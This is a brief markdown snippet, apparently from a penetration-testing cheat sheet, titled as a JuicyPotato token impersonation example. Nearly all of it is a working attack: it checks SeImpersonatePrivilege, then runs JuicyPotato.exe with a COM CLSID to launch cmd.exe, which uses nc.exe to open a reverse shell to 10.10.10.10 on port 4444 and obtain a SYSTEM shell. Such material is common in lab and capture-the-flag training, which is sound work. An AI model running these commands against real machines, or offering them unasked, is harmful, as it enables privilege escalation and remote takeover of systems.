# Example 3: JuicyPotato Token Impersonation

```powershell
# Verify SeImpersonatePrivilege
whoami /priv
# SeImpersonatePrivilege Enabled

# Run JuicyPotato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\nc.exe 10.10.10.10 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# Catch SYSTEM shell
```